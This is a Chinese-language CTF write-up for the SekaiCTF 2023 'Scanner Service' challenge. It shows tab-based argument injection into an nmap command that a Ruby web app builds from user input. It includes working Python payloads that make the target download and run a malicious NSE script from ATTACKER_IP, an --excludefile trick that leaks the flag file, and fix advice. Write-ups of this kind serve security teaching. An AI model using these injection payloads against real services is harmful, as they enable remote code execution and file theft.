# Scanner Service

## 题目简述

这是一个基于 Sinatra 的 Nmap 扫描服务。用户提交 `IP:端口` 后，后端先尝试建立 TCP 连接，再执行：

```ruby
IO.popen("nmap -p #{port} #{hostname}").read
```

`hostname` 的 IPv4 正则较严，但 `port` 只通过 Ruby `to_i` 检查，且自制转义函数遗漏了制表符。于是可以让端口以合法数字开头，再用 Tab 注入额外 Nmap 参数。

## 解题过程

端口校验为：

```ruby
def valid_port?(input)
  !input.nil? and (1..65535).cover?(input.to_i)
end
```

Ruby 的 `String#to_i` 只解析开头连续的数字：

```ruby
"8080 --script evil.nse".to_i
# => 8080
```

另一方面，`escape_shell_input` 会转义普通空格、分号、管道符等字符，却不处理 `\t`。Shell 同样把 Tab 视为空白，所以如下端口仍通过检查，却会在命令行中拆成多个参数：

```text
8080<TAB>--script<TAB>...
```

官方解法利用 Nmap Scripting Engine 分两步执行。先在攻击机的 80 或 8080 端口提供 `evil.nse`：

```lua
os.execute("cat /flag*")
```

第一条请求调用系统自带的 `http-fetch` NSE，把脚本下载到随机临时目录。表单中的空格要全部替换为 Tab：

```text
service=ATTACKER_IP:8080
        --script http-fetch
        -Pn
        --script-args
        http-fetch.destination=/tmp/sekai,
        http-fetch.url=evil.nse
```

实际提交时应连成一行：

```python
payload = (
    "ATTACKER_IP:8080 "
    "--script http-fetch -Pn "
    "--script-args "
    "http-fetch.destination=/tmp/sekai,"
    "http-fetch.url=evil.nse"
).replace(" ", "\t")

requests.post(target, data={"service": payload})
```

下载后的路径包含 Web 服务器地址和端口，例如：

```text
/tmp/sekai/ATTACKER_IP/8080/evil.nse
```

第二条请求加载它：

```python
payload = (
    "ATTACKER_IP:8080 "
    "--script=/tmp/sekai/"
    "ATTACKER_IP/8080/evil.nse"
).replace(" ", "\t")

response = requests.post(target, data={"service": payload})
```

Lua 的 `cat /flag*` 继承 Nmap 的标准输出，结果被 `IO.popen(...).read` 收集并显示在页面中。

还有一种不执行自定义脚本的读取方法：[参赛者记录](https://lebr0nli.github.io/blog/security/sekaiCTF-2023/#scanner-service-web)指出 `?` 也未被过滤，可让 `--excludefile` 读取随机文件名的 flag，再用 XML 输出把解析错误送到标准输出：

```text
127.0.0.1:1337<TAB>
--excludefile<TAB>
/flag-????????????????????????????????.txt<TAB>
-oX<TAB>
/proc/self/fd/1
```

Nmap 把文件内容当成待排除的主机名，报错中的“主机名”就是 flag。比赛环境的结果为：

```text
SEKAI{4r6um3n7_1nj3c710n_70_rc3!!}
```

## 方法总结

这里不是单个危险字符遗漏，而是验证语义与执行语义不一致：`to_i` 只验证数字前缀，Shell 却继续解释整个字符串，Tab 又绕过了仅针对普通空格的转义。正确修复应避免拼接命令字符串，使用参数数组调用 Nmap，并要求端口字符串整体匹配十进制格式；黑名单式 Shell 转义无法覆盖所有分隔符和工具自身的危险选项。
